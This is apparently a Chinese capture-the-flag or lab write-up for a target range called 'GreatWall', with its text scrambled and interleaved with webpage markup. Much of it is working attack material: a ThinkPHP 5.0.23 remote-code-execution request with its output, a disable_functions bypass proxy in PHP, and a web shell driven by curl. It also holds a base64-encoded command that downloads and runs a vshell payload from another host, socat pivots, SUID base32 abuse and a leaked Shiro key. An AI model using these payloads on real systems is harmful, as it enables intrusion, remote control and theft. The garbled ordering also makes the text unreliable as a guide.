+pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,file_get_contents,readfile,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,highlight_file,show_source,iconv,dl</td><td class='v'>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,file_get_contents,readfile,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,highlight_file,show_source,iconv,dl
+```
+
+全禁完了，大概率**LD_PRELOAD**了，原理可以看[webshell绕过disable_functions | the0n3](https://the0n3.top/pages/disfunc/)
+
+这个是内网，所以蚁剑走个外网主机的代理去内网访问即可
+```bash
+www-data@portal:/tmp/OAsystem$ ./socat TCP-LISTEN:10001,fork TCP:172.28.23.26:80 &
+[1] 4300
+```
+绕过LD_PRELOAD后，蚁剑会在upload下生产.antproxy.php文件，
+
+```php
+<?php
+function get_client_header(){
+    $headers=array();
+    foreach($_SERVER as $k=>$v){
+        if(strpos($k,'HTTP_')===0){
+            $k=strtolower(preg_replace('/^HTTP/', '', $k));
+            $k=preg_replace_callback('/_\w/','header_callback',$k);
+            $k=preg_replace('/^_/','',$k);
+            $k=str_replace('_','-',$k);
+            if($k=='Host') continue;
+            $headers[]='$k:$v';
+        }
+    }
+    return $headers;
+}
+function header_callback($str){
+    return strtoupper($str[0]);
+}
+function parseHeader($sResponse){
+    list($headerstr,$sResponse)=explode('
+
+',$sResponse, 2);
+    $ret=array($headerstr,$sResponse);
+    if(preg_match('/^HTTP/1.1 d{3}/', $sResponse)){
+        $ret=parseHeader($sResponse);
+    }
+    return $ret;
+}
+
+set_time_limit(120);
+$headers=get_client_header();
+$host = '127.0.0.1';
+$port = 61212;
+$errno = '';
+$errstr = '';
+$timeout = 30;
+$url = '/2025-12-18-69439f1adcb82.php';
+
+if (!empty($_SERVER['QUERY_STRING'])){
+    $url .= '?'.$_SERVER['QUERY_STRING'];
+};
+
+$fp = fsockopen($host, $port, $errno, $errstr, $timeout);
+if(!$fp){
+    return false;
+}
+
+$method = 'GET';
+$post_data = '';
+if($_SERVER['REQUEST_METHOD']=='POST') {
+    $method = 'POST';
+    $post_data = file_get_contents('php://input');
+}
+
+$out = $method.' '.$url.' HTTP/1.1\r\n';
+$out .= 'Host: '.$host.':'.$port.'\r\n';
+if (!empty($_SERVER['CONTENT_TYPE'])) {
+    $out .= 'Content-Type: '.$_SERVER['CONTENT_TYPE'].'\r\n';
+}
+$out .= 'Content-length:'.strlen($post_data).'\r\n';
+
+$out .= implode('\r\n',$headers);
+$out .= '\r\n\r\n';
+$out .= ''.$post_data;
+
+fputs($fp, $out);
+
+$response = '';
+while($row=fread($fp, 4096)){
+    $response .= $row;
+}
+fclose($fp);
+$pos = strpos($response, '\r\n\r\n');
+$response = substr($response, $pos+4);
+echo $response;
+
+```
+其中重要的是`$url = '/2025-12-18-69439f1adcb82.php';`字段
+他去web根下找这个php文件，包找不到的，所以改成upload下，不过改了之后仍然不行，也是很神奇，有点神奇
+
+最终方法是在web根下传了个system的get马，antproxy指过去`$url = '/shell.php';`不过蚁剑还是连不上实在没明白，但是直接curl antproxy可以执行命令
+```bash
+www-data@portal:/tmp/OAsystem$ curl 'http://172.28.23.26/upload/.antproxy.php?cmd=ls'
+Api
+Classes
+checklogin.php
+db.php
+db_oasystem.sql
+download
+fn.php
+index.php
+main.php
+manage
+nginx.htaccess
+oa4.png
+shell.php
+sqlbackup
+static
+system
+upfile.php
+upload
+upload.php
+uploadbase64.php
+uploadimage
+usertab.php
+ver.php
+```
+
+在外网主机做socat代理把10002端口流量转发到服务器上，上线vshell即可
+```
+www-data@portal:/tmp$ ./socat TCP4-LISTEN:10002,reuseaddr,fork TCP4:ip:port &
+[2] 4514
+www-data@portal:/tmp$ curl 'http://172.28.23.26/upload/.antproxy.php?cmd=echo+KGN1cmwgLWZzU0wgLW0xODAgaHR0cDovLzE3Mi4yOC4yMy4xNzoxMDAwMi9zbHR8fHdnZXQgLVQxODAgLXEgaHR0cDovLzE3Mi4yOC4yMy4xNzoxMDAwMi9zbHQpfHNo+|base64+-d|bash'
+```
+
+### flag2
+
+根下需要root才能读flag2
+```bash
+www-data@ubuntu-oa:/tmp$ find / -perm -4000 2>/dev/null
+/bin/fusermount
+/bin/ping6
+/bin/mount
+/bin/su
+/bin/ping
+/bin/umount
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/staprun
+/usr/bin/base32
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/s-nail/s-nail-privsep
+```
+可以看到有base32，读完解码即可
+
+
+## 172.28.23.33/172.22.10.16
+
+### web
+同样走代理
+heapdump拿下来，分析一手可以得到，shiro框架
+```
+CookieRememberMeManager(ShiroKey)
+-------------
+algMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES
+```
+
+
+<img width='2548' height='1295' alt='Image' src='https://github.com/user-attachments/assets/0aad6aa1-7825-4994-8588-8eb303c7eab5' />
+
+直接一把梭了，[SummerSec/ShiroAttack2: shiro反序列化漏洞综合利用,包含（回显执行命令/注入内存马）修复原版中NoCC的问题 https://github.com/j1anFen/shiro_attack](https://github.com/SummerSec/ShiroAttack2)
+
+继续上线vshell
+
+还开了个59696端口，同时发现新的内网段
+```bash
+ops01@ubuntu-erp:~$ file HashNote 
+HashNote: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=1a23e8dbc5918602e6a0994df9b044d92ba96c87, for GNU/Linux 3.2.0, stripped
+ops01@ubuntu-erp:~$ ss -lnt
+State            Recv-Q           Send-Q                      Local Address:Port                        Peer Address:Port           Process           
+LISTEN           0                4096                        127.0.0.53%lo:53                               0.0.0.0:*                                
+LISTEN           0                128                               0.0.0.0:22                               0.0.0.0:*                                
+LISTEN           0                64                                0.0.0.0:59696                            0.0.0.0:*                                
+LISTEN           0                100                                     *:8080                                   *:*    
+```
+很多方法没找到具体pid，不过大概也可以猜到就是这个elf了，交给队友拷打了，继续内网
+
+### flag3
+
+在root下
+
+# 内网横向(第二层)
+
+```bash
+www-data@ubuntu-oa:/tmp$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:16:3e:05:09:70 brd ff:ff:ff:ff:ff:ff
+    inet 172.28.23.26/16 brd 172.28.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::216:3eff:fe05:970/64 scope link 
+       valid_lft forever preferred_lft forever
+3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:16:3e:05:08:f6 brd ff:ff:ff:ff:ff:ff
+    inet 172.22.14.6/16 brd 172.22.255.255 scope global eth1
+       valid_lft forever preferred_lft forever
+    inet6 fe80::216:3eff:fe05:8f6/64 scope link 
+       valid_lft forever preferred_lft forever
+       
+ops01@ubuntu-erp:~$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:16:3e:05:09:55 brd ff:ff:ff:ff:ff:ff
+    inet 172.28.23.33/16 brd 172.28.255.255 scope global dynamic eth0
+       valid_lft 1892152665sec preferred_lft 1892152665sec
+    inet6 fe80::216:3eff:fe05:955/64 scope link 
+       valid_lft forever preferred_lft forever
+3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:16:3e:05:09:59 brd ff:ff:ff:ff:ff:ff
+    inet 172.22.10.16/24 brd 172.22.10.255 scope global eth1
+       valid_lft forever preferred_lft forever
+    inet6 fe80::216:3eff:fe05:959/64 scope link 
+       valid_lft forever preferred_lft forever
+```
+
+
+```bash
+ops01@ubuntu-erp:/tmp/test$ ./fscan -h 172.22.10.16/24
+
+   ___                              _    
+  / _ \     ___  ___ _ __ __ _  ___| | __ 
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   <    
+\____/     |___/\___|_|  \__,_|\___|_|\_\   
+                     fscan version: 1.8.4
+start infoscan
+trying RunIcmp2
+The current user permissions unable to send icmp packets
+start ping
+(icmp) Target 172.22.10.28    is alive
+(icmp) Target 172.22.10.16    is alive
+[*] Icmp alive hosts len is: 2
+172.22.10.28:3306 open
+172.22.10.28:80 open
+172.22.10.28:22 open
+[*] alive ports len is: 5
+start vulscan
+[*] WebTitle http://172.22.10.28       code:200 len:1975   title:DooTask
+
+
+
+www-data@ubuntu-oa:/tmp/test$ ./fscan -h 172.22.14.6/24
+
+   ___                              _    
+  / _ \     ___  ___ _ __ __ _  ___| | __ 
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   <    
+\____/     |___/\___|_|  \__,_|\___|_|\_\   
+                     fscan version: 1.8.4
+start infoscan
+trying RunIcmp2
+The current user permissions unable to send icmp packets
+start ping
+(icmp) Target 172.22.14.37    is alive
+(icmp) Target 172.22.14.46    is alive
+(icmp) Target 172.22.14.6     is alive
+[*] Icmp alive hosts len is: 3
+172.22.14.46:80 open
+172.22.14.46:22 open
+172.22.14.37:22 open
+172.22.14.37:10250 open
+172.22.14.37:2379 open
+[*] alive ports len is: 8
+start vulscan
+[*] WebTitle http://172.22.14.46       code:200 len:785    title:Harbor
+[+] InfoScan http://172.22.14.46       [Harbor] 
+[*] WebTitle https://172.22.14.37:10250 code:404 len:19     title:None
+[+] PocScan http://172.22.14.46/swagger.json poc-yaml-swagger-ui-unauth [{path swagger.json}]
+```
+
+
+有个主机**172.22.10.28**，开放ssh，mysql，web，还有两台**172.22.14.37**这台主机开放了22，10250端口和2379端口
+
+10250端口是Kubelet 的默认监听端口，用于与 API Server 通信，管理节点和容器的状态。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://faabbi.github.io/post/GreatWall.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/99706997?v=4">
+<title>GreatWall</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">GreatWall</h1>
+<div class="title-right">
+    <a href="https://faabbi.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/faabbi/faabbi.github.io/issues/38" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>信息收集</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[~/tools/frp]
+└─<span class="pl-c"><span class="pl-c">#</span> nmap --min-rate 10000 -p- 8.130.152.214</span>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 13:47 CST
+Warning: 8.130.152.214 giving up on port because retransmission cap hit (10).
+Nmap scan report <span class="pl-k">for</span> 8.130.152.214
+Host is up (0.15s latency).
+Not shown: 57617 closed tcp ports (reset), 7915 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 50.66 seconds</pre></div>
+<p>tcp开了两个web和一个ssh</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[~/tools/frp]
+└─<span class="pl-c"><span class="pl-c">#</span> nmap -sU --top-ports 20 8.130.152.214</span>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 13:48 CST
+Nmap scan report <span class="pl-k">for</span> 8.130.152.214
+Host is up (0.029s latency).
+
+PORT      STATE         SERVICE
+53/udp    closed        domain
+67/udp    closed        dhcps
+68/udp    open<span class="pl-k">|</span>filtered dhcpc
+69/udp    closed        tftp
+123/udp   open<span class="pl-k">|</span>filtered ntp
+135/udp   open<span class="pl-k">|</span>filtered msrpc
+137/udp   open<span class="pl-k">|</span>filtered netbios-ns
+138/udp   open<span class="pl-k">|</span>filtered netbios-dgm
+139/udp   open<span class="pl-k">|</span>filtered netbios-ssn
+161/udp   closed        snmp
+162/udp   open<span class="pl-k">|</span>filtered snmptrap
+445/udp   open<span class="pl-k">|</span>filtered microsoft-ds
+500/udp   closed        isakmp
+514/udp   open<span class="pl-k">|</span>filtered syslog
+520/udp   closed        route
+631/udp   closed        ipp
+1434/udp  open<span class="pl-k">|</span>filtered ms-sql-m
+1900/udp  closed        upnp
+4500/udp  closed        nat-t-ike
+49152/udp closed        unknown
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 8.11 seconds</pre></div>
+<p>udp一如既往先不看</p>
+<p>80端口没什么进展，目录扫描也没什么有用信息，8080端口同样但是有个404状态码，有些时候404的特征信息就可以暴露框架</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> dirsearch -u http://8.130.152.214:8080/</span>
+
+Target: http://8.130.152.214:8080/
+
+[13:50:00] Starting:
+[13:50:24] 404 -    7KB - /index.php/login/
+[13:50:33] 200 -   24B  - /robots.txt
+[13:50:35] 301 -  322B  - /static  -<span class="pl-k">&gt;</span>  http://8.130.152.214:8080/static/</pre></div>
+<p>有用的只有这三个，在访问/index.php/login/时暴露了框架信息</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> curl http://8.130.152.214:8080/index.php/login/                     </span>
+
+<span class="pl-k">&lt;</span><span class="pl-k">!</span>DOCTYPE html<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>html<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>body<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>echo<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+            <span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>
+        <span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>exception<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+
+            <span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>info<span class="pl-pds">"</span></span>&gt;&lt;h<span class="pl-k">1&gt;</span>页面错误！请稍后再试～<span class="pl-k">&lt;</span>/h1&gt;&lt;/div<span class="pl-k">&gt;</span>
+
+    <span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>
+
+
+
+    <span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>copyright<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+        <span class="pl-k">&lt;</span>a title=<span class="pl-s"><span class="pl-pds">"</span>官方网站<span class="pl-pds">"</span></span> href=<span class="pl-s"><span class="pl-pds">"</span>http://www.thinkphp.cn<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>ThinkPHP<span class="pl-k">&lt;</span>/a<span class="pl-k">&gt;</span>
+        <span class="pl-k">&lt;</span>span<span class="pl-k">&gt;</span>V5.0.<span class="pl-k">23&lt;</span>/span<span class="pl-k">&gt;</span>
+        <span class="pl-k">&lt;</span>span<span class="pl-k">&gt;</span>{ 十年磨一剑-为API开发设计的高性能框架 }<span class="pl-k">&lt;</span>/span<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>/body<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/html<span class="pl-k">&gt;</span></pre></div>
+<p>忽略样式信息可以看到架构是tp5.0.23</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> searchsploit ThinkPHP</span>
+--------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                             <span class="pl-k">|</span>  Path
+--------------------------------------------------------------------------- ---------------------------------
+ThinkPHP - Multiple PHP Injection RCEs (Metasploit)                        <span class="pl-k">|</span> linux/remote/48333.rb
+ThinkPHP 2.0 - <span class="pl-s"><span class="pl-pds">'</span>index.php<span class="pl-pds">'</span></span> Cross-Site Scripting                            <span class="pl-k">|</span> php/webapps/33933.txt
+ThinkPHP 5.0.23/5.1.31 - Remote Code Execution                             <span class="pl-k">|</span> php/webapps/45978.txt
+ThinkPHP 5.X - Remote Command Execution                                    <span class="pl-k">|</span> php/webapps/46150.txt
+--------------------------------------------------------------------------- ---------------------------------</pre></div>
+<p>漏洞库可以看到有rce但是他这个exp有问题</p>
+<h1>Web</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">POST /index.php<span class="pl-k">?</span>s=captcha HTTP/1.1
+Host: 8.130.152.214:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0<span class="pl-k">;</span> Win64<span class="pl-k">;</span> x64<span class="pl-k">;</span> rv:146.0) Gecko/20100101 Firefox/146.0
+Accept: text/html,application/xhtml+xml,application/xml<span class="pl-k">;</span>q=0.9,<span class="pl-k">*</span>/<span class="pl-k">*</span><span class="pl-k">;</span>q=0.8
+Accept-Language: zh-CN,zh<span class="pl-k">;</span>q=0.8,zh-TW<span class="pl-k">;</span>q=0.7,zh-HK<span class="pl-k">;</span>q=0.5,en-US<span class="pl-k">;</span>q=0.3,en<span class="pl-k">;</span>q=0.2
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 72
+
+_method=__construct<span class="pl-k">&amp;</span>filter[]=system<span class="pl-k">&amp;</span>method=get<span class="pl-k">&amp;</span>server[REQUEST_METHOD]=id</pre></div>
+<p>curl下即可得到回显</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> curl http://8.130.152.214:8080/index.php?s=captcha -X POST -d '_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id'</span>
+
+<span class="pl-k">&lt;</span>body<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>echo<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+        uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    <span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>
+        <span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>exception<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+
+            <span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>info<span class="pl-pds">"</span></span>&gt;&lt;h<span class="pl-k">1&gt;</span>页面错误！请稍后再试～<span class="pl-k">&lt;</span>/h1&gt;&lt;/div<span class="pl-k">&gt;</span>
+
+    <span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>
+
+
+
+    <span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>copyright<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+        <span class="pl-k">&lt;</span>a title=<span class="pl-s"><span class="pl-pds">"</span>官方网站<span class="pl-pds">"</span></span> href=<span class="pl-s"><span class="pl-pds">"</span>http://www.thinkphp.cn<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>ThinkPHP<span class="pl-k">&lt;</span>/a<span class="pl-k">&gt;</span>
+        <span class="pl-k">&lt;</span>span<span class="pl-k">&gt;</span>V5.0.<span class="pl-k">23&lt;</span>/span<span class="pl-k">&gt;</span>
+        <span class="pl-k">&lt;</span>span<span class="pl-k">&gt;</span>{ 十年磨一剑-为API开发设计的高性能框架 }<span class="pl-k">&lt;</span>/span<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>/body<span class="pl-k">&gt;</span></pre></div>
+<p>直接vshell上线即可，这里我用的云服务器打，不详细展示，有关vshell的可以自行搜索</p>
+<h3>flag1</h3>
+<p>在根下可以拿到</p>
+<h1>内网横向(第一层)</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@portal:/$ ip a
+1: lo: <span class="pl-k">&lt;</span>LOOPBACK,UP,LOWER_UP<span class="pl-k">&gt;</span> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+2: eth0: <span class="pl-k">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="pl-k">&gt;</span> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:16:3e:05:09:48 brd ff:ff:ff:ff:ff:ff
+    inet 172.28.23.17/16 brd 172.28.255.255 scope global dynamic eth0
+       valid_lft 1892158846sec preferred_lft 1892158846sec
+    inet6 fe80::216:3eff:fe05:948/64 scope link
+       valid_lft forever preferred_lft forever</pre></div>
+<p>有个内网段，传fscan扫描，这里严重怀疑云镜要坑沙砾了，后两位主机位www-data没有权限发icmp包，只能ping，太慢了，这里直接当24网段扫了，第一位主机位没存活</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@portal:/tmp$ ./fscan -h 172.28.23.17/24
+
+   ___                              _
+  / _ <span class="pl-cce">\ </span>    ___  ___ _ __ __ _  ___<span class="pl-k">|</span> <span class="pl-k">|</span> __
+ / /_<span class="pl-cce">\/</span>____/ __<span class="pl-k">|</span>/ __<span class="pl-k">|</span> <span class="pl-s"><span class="pl-pds">'</span>__/ _` |/ __| |/ /</span>
+<span class="pl-s">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span>
+<span class="pl-s">\____/     |___/\___|_|  \__,_|\___|_|\_\</span>
+<span class="pl-s">                     fscan version: 1.8.4</span>
+<span class="pl-s">start infoscan</span>
+<span class="pl-s">trying RunIcmp2</span>
+<span class="pl-s">The current user permissions unable to send icmp packets</span>
+<span class="pl-s">start ping</span>
+<span class="pl-s">(icmp) Target 172.28.23.33    is alive</span>
+<span class="pl-s">(icmp) Target 172.28.23.17    is alive</span>
+<span class="pl-s">(icmp) Target 172.28.23.26    is alive</span>
+<span class="pl-s">[*] Icmp alive hosts len is: 3</span>
+<span class="pl-s">172.28.23.26:22 open</span>
+<span class="pl-s">172.28.23.17:22 open</span>
+<span class="pl-s">172.28.23.33:22 open</span>
+<span class="pl-s">172.28.23.26:21 open</span>
+<span class="pl-s">172.28.23.33:8080 open</span>
+<span class="pl-s">172.28.23.17:8080 open</span>
+<span class="pl-s">172.28.23.26:80 open</span>
+<span class="pl-s">172.28.23.17:80 open</span>
+<span class="pl-s">[*] alive ports len is: 8</span>
+<span class="pl-s">start vulscan</span>
+<span class="pl-s"></span>
+<span class="pl-s">[+] ftp 172.28.23.26:21:anonymous</span>
+<span class="pl-s">   [-&gt;]OASystem.zip</span>
+<span class="pl-s">[+] PocScan http://172.28.23.17:8080 poc-yaml-thinkphp5023-method-rce poc1</span>
+<span class="pl-s">[+] PocScan http://172.28.23.33:8080 poc-yaml-spring-actuator-heapdump-file</span>
+<span class="pl-s">[+] PocScan http://172.28.23.33:8080 poc-yaml-springboot-env-unauth spring2</span></pre></div>
+<p>有效信息这些，梳理一下</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">172.28.23.26       
+	ftp -<span class="pl-k">&gt;</span> 匿名登录有web源码
+	ssh 
+	http(80) -<span class="pl-k">&gt;</span> OA系统
+172.28.23.33
+	ssh
+	http(8080) -<span class="pl-k">&gt;</span> ERP -<span class="pl-k">&gt;</span> spring headdump泄露，未授权访问
+</pre></div>
+<h2>172.28.23.26</h2>
+<h3>ftp</h3>
+<p>下载源码审计在uploadbase64.php发现文件上传，可以把源码拉到本地，扫描器扫一下就出了</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">&lt;</span><span class="pl-k">?</span>php
+/<span class="pl-k">**</span>
+ <span class="pl-k">*</span> Description: PhpStorm.
+ <span class="pl-k">*</span> Author: yoby
+ <span class="pl-k">*</span> DateTime: 2018/12/4 18:01
+ <span class="pl-k">*</span> Email:logove@qq.com
+ <span class="pl-k">*</span> Copyright Yoby版权所有
+ <span class="pl-k">*</span>/
+<span class="pl-smi">$img</span> = <span class="pl-smi">$_POST</span>[<span class="pl-s"><span class="pl-pds">'</span>imgbase64<span class="pl-pds">'</span></span>]<span class="pl-k">;</span>
+<span class="pl-k">if</span> (preg_match(<span class="pl-s"><span class="pl-pds">'</span>/^(data:\s*image\/(\w+);base64,)/<span class="pl-pds">'</span></span>, <span class="pl-smi">$img</span>, <span class="pl-smi">$result</span>)) {
+    <span class="pl-smi">$type</span> = <span class="pl-s"><span class="pl-pds">"</span>.<span class="pl-pds">"</span></span>.<span class="pl-smi">$result</span>[2]<span class="pl-k">;</span>
+    <span class="pl-smi">$path</span> = <span class="pl-s"><span class="pl-pds">"</span>upload/<span class="pl-pds">"</span></span> <span class="pl-c1">.</span> date(<span class="pl-s"><span class="pl-pds">"</span>Y-m-d<span class="pl-pds">"</span></span>) <span class="pl-c1">.</span> <span class="pl-s"><span class="pl-pds">"</span>-<span class="pl-pds">"</span></span> <span class="pl-c1">.</span> <span class="pl-en">uniqid</span>() <span class="pl-c1">.</span> <span class="pl-smi">$type</span>;
+}
+<span class="pl-smi">$img</span> =  base64_decode(str_replace(<span class="pl-smi">$result</span>[1], <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>, <span class="pl-smi">$img</span>))<span class="pl-k">;</span>
+@file_put_contents(<span class="pl-smi">$path</span>, <span class="pl-smi">$img</span>)<span class="pl-k">;</span>
+exit(<span class="pl-s"><span class="pl-pds">'</span>{"src":"<span class="pl-pds">'</span></span>.<span class="pl-smi">$path</span>.<span class="pl-s"><span class="pl-pds">'</span>"}<span class="pl-pds">'</span></span>)<span class="pl-k">;</span></pre></div>
+<h3>web</h3>
+<p>先测试下</p>
